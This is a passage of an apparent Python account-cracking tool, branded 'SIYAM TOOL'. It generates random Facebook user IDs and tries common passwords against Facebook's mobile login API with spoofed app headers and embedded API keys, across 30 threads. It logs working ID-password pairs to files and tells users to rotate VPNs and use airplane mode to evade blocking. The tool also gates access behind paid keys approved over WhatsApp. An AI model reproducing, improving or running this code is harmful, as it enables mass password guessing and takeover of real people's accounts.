            meth = 'B'
            break
        print(f"\n{R}{' ' * 8}[!] Invalid! Please enter A or B{RESET}")
        time.sleep(1)
        os.system("clear")
        banner()
        print()
        print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'║'}{' ' * 14}{Y}🔧 SELECT METHOD{RESET}{C}{' ' * 20}{'║'}{RESET}")
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'╠' + '═' * 48 + '╣'}{RESET}")
        print_option_box("A)", "METHOD 1", G)
        print_option_box("B)", "METHOD 2", G)
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
        print()
    
    print()
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 10}{W}📊 TOTAL ID:{RESET} {G}{limit}{C}{' ' * 26}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{R}✈️ USE AIRPLANE MOD FOR GOOD RESULT{C}{' ' * 6}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{ORANGE}📡 RECOMMENDED VPN: Japan / US / Singapore{C}{' ' * 3}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{BRIGHT_PURPLE}[!] Use VPN for better performance{C}{' ' * 12}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 14}{G}🚀 Starting crack...{RESET}{C}{' ' * 21}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    with tred(max_workers=30) as pool:
        for mal in user:
            uid = star + mal
            if meth == 'A' or meth == 'a' or meth == '1':
                pool.submit(login_1, uid)
            elif meth == 'B' or meth == 'b' or meth == '2':
                pool.submit(login_2, uid)

def old_Tow():
    user = []
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 10}{Y}2010-2014{RESET}{C}{' ' * 17}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    ask = input(f"{G}{' ' * 8}[?] SELECT: {RESET}")
    linex()
    
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 8}{Y}📊 HOW MANY IDS?{RESET}{C}{' ' * 23}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{W}📝 Example:{RESET} {G}20000 / 30000 / 99999{C}{' ' * 9}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    while True:
        try:
            limit = int(input(f"{G}{' ' * 8}[?] TOTAL ID COUNT: {RESET}"))
            if limit > 0:
                break
            print(f"\n{R}{' ' * 8}[!] Please enter a positive number!{RESET}")
            time.sleep(1)
            os.system("clear")
            banner()
            print()
            print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 8}{Y}📊 HOW MANY IDS?{RESET}{C}{' ' * 23}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 4}{W}📝 Example:{RESET} {G}20000 / 30000 / 99999{C}{' ' * 9}{'║'}{RESET}")
            print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
            print()
        except ValueError:
            print(f"\n{R}{' ' * 8}[!] Invalid! Please enter a number!{RESET}")
            time.sleep(1)
            os.system("clear")
            banner()
            print()
            print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 8}{Y}📊 HOW MANY IDS?{RESET}{C}{' ' * 23}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 4}{W}📝 Example:{RESET} {G}20000 / 30000 / 99999{C}{' ' * 9}{'║'}{RESET}")
            print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
            print()
    
    linex()
    
    prefixes = ['100002', '100003', '100004', '100005', '100006', '100007', '100008', '100009', '10001', '10002', '10003']
    print(f"{Y}{' ' * 8}[⏳] Generating {limit} IDs...{RESET}")
    for _ in range(limit):
        prefix = random.choice(prefixes)
        suffix_length = 15 - len(prefix)
        suffix = ''.join(str(random.randint(0, 9)) for _ in range(suffix_length))
        uid = prefix + suffix
        user.append(uid)
    
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 14}{Y}🔧 SELECT METHOD{RESET}{C}{' ' * 20}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'╠' + '═' * 48 + '╣'}{RESET}")
    print_option_box("A)", "METHOD A", G)
    print_option_box("B)", "METHOD B", G)
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    while True:
        meth = input(f"{G}{' ' * 8}[?] CHOICE (A/B): {RESET}").strip()
        if meth == 'A' or meth == 'a' or meth == '1':
            meth = 'A'
            break
        elif meth == 'B' or meth == 'b' or meth == '2':
            meth = 'B'
            break
        print(f"\n{R}{' ' * 8}[!] Invalid! Please enter A or B{RESET}")
        time.sleep(1)
        os.system("clear")
        banner()
        print()
        print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'║'}{' ' * 14}{Y}🔧 SELECT METHOD{RESET}{C}{' ' * 20}{'║'}{RESET}")
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'╠' + '═' * 48 + '╣'}{RESET}")
        print_option_box("A)", "METHOD A", G)
        print_option_box("B)", "METHOD B", G)
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
        print()
    
    print()
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 10}{W}📊 TOTAL ID:{RESET} {G}{limit}{C}{' ' * 26}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{R}✈️ USE AIRPLANE MOD FOR GOOD RESULT{C}{' ' * 6}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{ORANGE}📡 RECOMMENDED VPN: Japan / US / Singapore{C}{' ' * 3}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{BRIGHT_PURPLE}[!] Use VPN for better performance{C}{' ' * 12}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 14}{G}🚀 Starting crack...{RESET}{C}{' ' * 21}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    with tred(max_workers=30) as pool:
        for mal in user:
            uid = star + mal
            if meth == 'A' or meth == 'a' or meth == '1':
                pool.submit(login_1, uid)
            elif meth == 'B' or meth == 'b' or meth == '2':
                pool.submit(login_2, uid)

def old_Tree():
    user = []
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 10}{Y}2009 {RESET}{C}{' ' * 16}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    ask = input(f"{G}{' ' * 8}[?] SELECT: {RESET}")
    linex()
    
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 8}{Y}📊 HOW MANY IDS?{RESET}{C}{' ' * 23}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{W}📝 Example:{RESET} {G}20000 / 30000 / 99999{C}{' ' * 9}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    while True:
        try:
            limit = int(input(f"{G}{' ' * 8}[?] TOTAL ID COUNT: {RESET}"))
            if limit > 0:
                break
            print(f"\n{R}{' ' * 8}[!] Please enter a positive number!{RESET}")
            time.sleep(1)
            os.system("clear")
            banner()
            print()
            print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 8}{Y}📊 HOW MANY IDS?{RESET}{C}{' ' * 23}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 4}{W}📝 Example:{RESET} {G}20000 / 30000 / 99999{C}{' ' * 9}{'║'}{RESET}")
            print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
            print()
        except ValueError:
            print(f"\n{R}{' ' * 8}[!] Invalid! Please enter a number!{RESET}")
            time.sleep(1)
            os.system("clear")
            banner()
            print()
            print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 8}{Y}📊 HOW MANY IDS?{RESET}{C}{' ' * 23}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
            print(f"{C}{'║'}{' ' * 4}{W}📝 Example:{RESET} {G}20000 / 30000 / 99999{C}{' ' * 9}{'║'}{RESET}")
            print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
            print()
    
    linex()
    
    prefixes = ['10004', '10005', '10006', '10007', '10008', '10009', '10010', '10011']
    print(f"{Y}{' ' * 8}[⏳] Generating {limit} IDs...{RESET}")
    for _ in range(limit):
        prefix = random.choice(prefixes)
        suffix_length = 15 - len(prefix)
        suffix = ''.join(str(random.randint(0, 9)) for _ in range(suffix_length))
        uid = prefix + suffix
        user.append(uid)
    
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 14}{Y}🔧 SELECT METHOD{RESET}{C}{' ' * 20}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'╠' + '═' * 48 + '╣'}{RESET}")
    print_option_box("A)", "METHOD A", G)
    print_option_box("B)", "METHOD B", G)
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    while True:
        meth = input(f"{G}{' ' * 8}[?] CHOICE (A/B): {RESET}").strip()
        if meth == 'A' or meth == 'a' or meth == '1':
            meth = 'A'
            break
        elif meth == 'B' or meth == 'b' or meth == '2':
            meth = 'B'
            break
        print(f"\n{R}{' ' * 8}[!] Invalid! Please enter A or B{RESET}")
        time.sleep(1)
        os.system("clear")
        banner()
        print()
        print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'║'}{' ' * 14}{Y}🔧 SELECT METHOD{RESET}{C}{' ' * 20}{'║'}{RESET}")
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'╠' + '═' * 48 + '╣'}{RESET}")
        print_option_box("A)", "METHOD A", G)
        print_option_box("B)", "METHOD B", G)
        print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
        print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
        print()
    
    print()
    banner()
    print()
    print(f"{C}{'╔' + '═' * 48 + '╗'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 10}{W}📊 TOTAL ID:{RESET} {G}{limit}{C}{' ' * 26}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 48}{C}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{R}✈️ USE AIRPLANE MOD FOR GOOD RESULT{C}{' ' * 6}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{ORANGE}📡 RECOMMENDED VPN: Japan / US / Singapore{C}{' ' * 3}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 4}{BRIGHT_PURPLE}[!] Use VPN for better performance{C}{' ' * 12}{'║'}{RESET}")
    print(f"{C}{'║'}{' ' * 14}{G}🚀 Starting crack...{RESET}{C}{' ' * 21}{'║'}{RESET}")
    print(f"{C}{'╚' + '═' * 48 + '╝'}{RESET}")
    print()
    
    with tred(max_workers=30) as pool:
        for mal in user:
            uid = star + mal
            if meth == 'A' or meth == 'a' or meth == '1':
                pool.submit(login_1, uid)
            elif meth == 'B' or meth == 'b' or meth == '2':
                pool.submit(login_2, uid)

def login_1(uid):
    global loop, oks
    session = requests.session()
    
    passwords = ['123456', '1234567', '12345678', '123456789', '123123']
    
    for pw in passwords:
        try:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': random.choice(['US', 'GB', 'IN', 'ID', 'BD']),
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=5).json()
            
            if 'session_key' in res:
                speak("Valid Id Found", msg_type="valid_id")
                profile_link = f"https://facebook.com/{uid}"
                creation_year = creationyear(str(uid))
                
                sys.stdout.write("\r" + " " * 80 + "\r")
                
                print(f"\n{G}{'='*50}{RESET}")
                print(f"{G}[+] Uid : {W}{uid} | {G}Pass : {pw}{RESET}")
                print(f"{G}[+] CREATION  : {W}{creation_year}{RESET}")
                print(f"{G}[+] PROFILE   : {W}{profile_link}{RESET}")
                print(f"{C}{'='*50}{RESET}\n")
                
                with open(OK_FILE_1, 'a') as f:
                    f.write(f"{uid}|{pw}|{profile_link}|{creation_year}\n")
                oks.append(uid)
                break
                
            elif 'www.facebook.com' in str(res.get('error', {}).get('message', '')):
                speak("Valid Id Found", msg_type="valid_id")
                profile_link = f"https://facebook.com/{uid}"
                creation_year = creationyear(str(uid))
                
                sys.stdout.write("\r" + " " * 80 + "\r")
                
                print(f"\n{G}{'='*50}{RESET}")
                print(f"{G}[+] Uid : {W}{uid} | {G}Pass : {pw}{RESET}")
                print(f"{G}[+] CREATION  : {W}{creation_year}{RESET}")
                print(f"{G}[+] PROFILE   : {W}{profile_link}{RESET}")
                print(f"{C}{'='*50}{RESET}\n")
                
                with open(OK_FILE_1, 'a') as f:
                    f.write(f"{uid}|{pw}|{profile_link}|{creation_year}\n")
                oks.append(uid)
                break
                
        except Exception:
            pass
    
    loop += 1
    sys.stdout.write(f"\r{C}[SIYAM-M1] LOOP:{W}{loop}{RESET} {G}OK:{W}{len(oks)}{RESET}")
    sys.stdout.flush()


def login_2(uid):
    global loop, oks
    session = requests.session()
    
    passwords = ['123456', '123123', '1234567', '12345678', '123456789']
    
    for pw in passwords:
        try:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': random.choice(['US', 'GB', 'IN', 'ID', 'BD']),
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=5).json()
            
            if 'session_key' in res:
                speak("Valid Id Found", msg_type="valid_id")
                profile_link = f"https://facebook.com/{uid}"
                creation_year = creationyear(str(uid))
                
                sys.stdout.write("\r" + " " * 80 + "\r")
                
                print(f"\n{G}{'='*50}{RESET}")
                print(f"{G}[+] Uid : {W}{uid} | {G}Pass : {pw}{RESET}")
                print(f"{G}[+] CREATION  : {W}{creation_year}{RESET}")
                print(f"{G}[+] PROFILE   : {W}{profile_link}{RESET}")
                print(f"{C}{'='*50}{RESET}\n")
                
                with open(OK_FILE_2, 'a') as f:
                    f.write(f"{uid}|{pw}|{profile_link}|{creation_year}\n")
                oks.append(uid)
                break
                
            elif 'www.facebook.com' in str(res.get('error', {}).get('message', '')):
                speak("Valid Id Found", msg_type="valid_id")
                profile_link = f"https://facebook.com/{uid}"
                creation_year = creationyear(str(uid))
                
                sys.stdout.write("\r" + " " * 80 + "\r")
                
                print(f"\n{G}{'='*50}{RESET}")
                print(f"{G}[+] Uid : {W}{uid} | {G}Pass : {pw}{RESET}")
                print(f"{G}[+] CREATION  : {W}{creation_year}{RESET}")
                print(f"{G}[+] PROFILE   : {W}{profile_link}{RESET}")
                print(f"{C}{'='*50}{RESET}\n")
                
                with open(OK_FILE_2, 'a') as f:
                    f.write(f"{uid}|{pw}|{profile_link}|{creation_year}\n")
                oks.append(uid)
                break
                
        except Exception:
            pass
    
    loop += 1
    sys.stdout.write(f"\r{C}[SIYAM-M2] LOOP:{W}{loop}{RESET} {G}OK:{W}{len(oks)}{RESET}")
    sys.stdout.flush()
    
def get_whatsapp_link(user_key, message_type="approval"):
    if message_type == "renew":
        msg = f"Hello Admin, my key has expired. Please renew:\n{user_key}"
    elif message_type == "approval":
        msg = f"Hello Admin, please approve my key:\n{user_key}"
    else:
        msg = f"Hello Admin, regarding key:\n{user_key}"
    
    encoded_msg = urllib.parse.quote(msg)
    return f"https://wa.me/{ADMIN_NUMBER[1:]}?text={encoded_msg}"

# ========== DISPLAY KEY STATUS ON MAIN SCREEN ==========
def display_key_status():
    """Display status with *** before Enter, then auto detect after Enter"""
    user_key = get_user_key()
    status_info = get_key_status(user_key)
    
    # Enter capar age *** dekhabe, Enter capar por real status
    if hasattr(display_key_status, 'enter_pressed'):
        # Enter capar por - real status dekhabe
        if status_info["status"] == "active":
            print(f"{' ' * 1}{Y}[ STATUS KEY : {G}ACTIVE {Y}]{RESET}")
            print_line_new()
        elif status_info["status"] == "expired":
            print(f"{' ' * 1}{Y}[ STATUS KEY : {R}EXPIRED {Y}]{RESET}")
        else:
            print(f"{' ' * 1}{Y}[ STATUS KEY : {Y}PENDING {Y}]{RESET}")
    else:
        # Enter capar age - *** dekhabe
        print(f"{' ' * 1}{Y}[ STATUS KEY : {C}*** {Y}]{RESET}")

# ========== MESSENGER GROUP ==========
def open_messenger_group():
    """Open Messenger group link every time tool runs"""
    group_link = "https://m.me/j/AbbHiUbVZYxa69-o/?send_source=gc%3Acopy_invite_link_c"
    
    system_name = platform.system()
    
    try:
        if system_name == "Android":
            # For Android - open with intent
            subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', '-d', group_link], 
                           capture_output=True, check=False)
        else:
            # For iOS, Windows, Linux, Mac - open in browser
            webbrowser.open(group_link)
    except Exception as e:
        # If fails, just show the link
        print(f"{Y}[!] Open this link: {group_link}{RESET}")
        
# ========== MAIN FUNCTION ==========
def main():
    global expired_message_shown
    
    # Open Messenger group every time
    speak("Opening To Messenger Group Join", msg_type="success")
    open_messenger_group()
    time.sleep(2)
    
    # ========== 1st LOADING ANIMATION ==========
    banner()
    print(f"\n{G}{'='*50}{RESET}")
    print()
    
    import threading
    github_done = False
    
    def do_github_sync():
        pull_from_github(silent=True)
        auto_delete_expired_keys()
        nonlocal github_done
        github_done = True
    
    # Start GitHub sync in thread
    github_thread = threading.Thread(target=do_github_sync)
    github_thread.start()
    
    # Dot Matrix Animation
    dots = 1
    direction = 1
    while not github_done:
        sys.stdout.write(f"\r{' ' * 10}{GOLD}⚡ SIYAM SERVER SYNC.... ⚡{RESET} {G}[{'●' * dots}{'○' * (6 - dots)}]{RESET}")
        sys.stdout.flush()
        
        dots += direction
        if dots >= 6:
            direction = -1
        elif dots <= 1:
            direction = 1
        
        time.sleep(0.15)
    
    sys.stdout.write(f"\r{' ' * 10}{GOLD}⚡ SIYAM SERVER SYNC.... ⚡{RESET} {G}[{'●' * 6}{'○' * 0}]{RESET}")
    sys.stdout.write("\n\n")
    time.sleep(0.3)
    
    banner()
    print(f"\n{G}{'='*50}{RESET}")
    print(f"\n{' ' * 15}{BRIGHT_GREEN}✓ Server Connected!{RESET}")
    time.sleep(0.5)
    os.system("clear")
    
    while True:
        banner()
        print()
        print_line()
        print(f"{' ' * 15}{Y}🔥 SIYAM TOOL 🔐{RESET}")
        print()
        print(f"{' ' * 15}{C}👑 SIYAM MAHMUD 👑 {RESET}")
        print()
        print(f"{' ' * 15}{R}[❗] APPROVAL SYSTEM [❗]️{RESET}")
        print_line()
        print()
        
        speak("Assalamu Walaikum Welcome to Siyam tool", msg_type="normal")
        
        master = input(f"{' ' * 8}{W}[?]{RESET}{G}Press ENTER to get Key{RESET}")
        
        #enet caple real Status
        display_key_status.enter_pressed = True
        
        if master.upper() == "ADMIN01":
            admin_panel()
            continue
        
        user_key = get_user_key()
        
        keys = load_approved_keys()
        key_valid = False
        key_expired = False
        expiry_date = None
        is_new = True
        
        for item in keys:
            if item["key"] == user_key:
                is_new = False
                if item["expiry"] == "unlimited":
                    key_valid = True
                else:
                    if " " in item["expiry"]:
                        expiry_time = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                        if datetime.now() <= expiry_time:
                            key_valid = True
                        else:
                            key_expired = True
                            expiry_date = item["expiry"]
                    else:
                        expiry_date_obj = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                        if date.today() <= expiry_date_obj:
                            key_valid = True
                        else:
                            key_expired = True
                            expiry_date = item["expiry"]
                break
        
        # ========== IF KEY VALID ==========
        if key_valid:
            expired_message_shown = False  # Reset flag for next time
            speak("Your Key Active Welcome Back Siyam Tool", msg_type="success")
            
            os.system("clear")
            banner()
            
            print(f"\n{' ' * 12}{Y}🔐 TOOL IS UNLOCKING...{RESET}\n")
            
            for i in range(101):
                percent = i
                bar_length = 30
                filled = int(bar_length * i // 100)
                bar = '█' * filled + '░' * (bar_length - filled)
                sys.stdout.write(f"\r{' ' * 12}{G}[{bar}]{RESET} {Y}{percent}%{RESET}")
                sys.stdout.flush()
                time.sleep(0.02)
            
            sys.stdout.write("\n\n")
            
            print(f"{' ' * 12}{G}[✓] TOOL IS RUNNING... PLEASE WAIT...{RESET}\n")
            print_line()
            print(f"{' ' * 15}{G}>>> TOOL UNLOCKED <<<{RESET}")
            print_line()
            time.sleep(1.5)
            BNG_71_()  
            return
        
        # ========== IF KEY NOT VALID ==========
        else:
            print()
            print(f"{' ' * 8}{C}{'╔' + '═' * 34 + '╗'}{RESET}")
            print(f"{' ' * 8}{C}{'║'}{' ' * 34}{C}{'║'}{RESET}")
            print(f"{' ' * 8}{C}{'║'}{' ' * 10}{BLINK}⚡ YOUR KEY ⚡{C}{' ' * 14}{'║'}{RESET}")
            print(f"{' ' * 8}{C}{'║'}{' ' * 34}{C}{'║'}{RESET}")
            print(f"{' ' * 8}{C}{'║'}{' ' * 10}{GOLD}{user_key}{C}{' ' * 10}{'║'}{RESET}")
            print(f"{' ' * 8}{C}{'║'}{' ' * 34}{C}{'║'}{RESET}")
            print(f"{' ' * 8}{C}{'╚' + '═' * 34 + '╝'}{RESET}")
            
            if key_expired:
                speak("Your key has expired. Please contact admin to renew.", msg_type="warning")
            elif is_new:
                speak("Copy Your Key Send To Admin", msg_type="warning")
            else:
                speak("Copy Your Key Send To Admin", msg_type="warning")
            
            print()
            print(f"{' ' * 8}{C}{'┌' + '─' * 34 + '┐'}{RESET}")
            print(f"{' ' * 8}{C}{'│'}{' ' * 34}{C}{'│'}{RESET}")
            
            if key_expired:
                print(f"{' ' * 8}{C}{'│'}{' ' * 10}{R}⚠️KEY EXPIRED⚠️{C}{' ' * 12}{'│'}{RESET}")
                print(f"{' ' * 8}{C}{'│'}{' ' * 4}{Y}[!] Expired on: {expiry_date}{C}{' ' * 4}{'│'}{RESET}")
                print(f"{' ' * 8}{C}{'│'}{' ' * 4}{Y}[!] Send to admin for renewal{C}{' ' * 4}{'│'}{RESET}")
            elif is_new:
                print(f"{' ' * 8}{C}{'│'}{' ' * 10}{Y}NEW KEY⚡{C}{' ' * 13}{'│'}{RESET}")
                print(f"{' ' * 8}{C}{'│'}{' ' * 4}{W}[?]{RESET} Send to admin for approval{C}{' ' * 4}{'│'}{RESET}")
            else:
                print(f"{' ' * 8}{C}{'│'}{' ' * 9}{Y}KEY PENDING{C}{' ' * 12}{'│'}{RESET}")
                print(f"{' ' * 8}{C}{'│'}{' ' * 4}{W}[?]{RESET} Send to admin for approval{C}{' ' * 4}{'│'}{RESET}")
            
            print(f"{' ' * 8}{C}{'│'}{' ' * 8}{W}[*]{RESET} Copy Key: {Y}{user_key}{C}{' ' * 4}{'│'}{RESET}")
            print(f"{' ' * 8}{C}{'│'}{' ' * 8}{W}[*]{RESET} Send to: {C}{ADMIN_NUMBER}{C}{' ' * 3}{'│'}{RESET}")
            print(f"{' ' * 8}{C}{'│'}{' ' * 34}{C}{'│'}{RESET}")
            print(f"{' ' * 8}{C}{'└' + '─' * 34 + '┘'}{RESET}")
            print()
            
            if key_expired:
                print(f"{' ' * 8}{Y}[?] Press ENTER to send renewal request...{RESET}")
                speak("Opening Admin WhatsApp", msg_type="success")
                input()
                print(f"{' ' * 8}{G}[+]{RESET} Your Key: {user_key}")
                print(f"{' ' * 8}{Y}[!]{RESET} Send this key to: {ADMIN_NUMBER}")
                open_admin_contact(ADMIN_LINK, ADMIN_NUMBER, user_key, is_renew=True)
                
                # Reset flag so message doesn't show again on next check
                expired_message_shown = True
                
            else:
                print(f"{' ' * 8}{Y}[?] Press ENTER to send request...{RESET}")
                speak("Opening Admin WhatsApp", msg_type="success")
                input()
                print(f"{' ' * 8}{G}[+]{RESET} Your Key: {user_key}")
                print(f"{' ' * 8}{Y}[!]{RESET} Send this key to: {ADMIN_NUMBER}")
                open_admin_contact(ADMIN_LINK, ADMIN_NUMBER, user_key, is_renew=False)
            
            print(f"{' ' * 8}{Y}[!]{RESET} Waiting for admin approval...")
            print(f"{' ' * 8}{Y}[!]{RESET} Siyam Tools [ 🛡️ ]")
            print(f"{' ' * 8}{Y}[!]{RESET} Press Ctrl+C to exit")
            print()
            
            try:
                while True:
                    time.sleep(3)
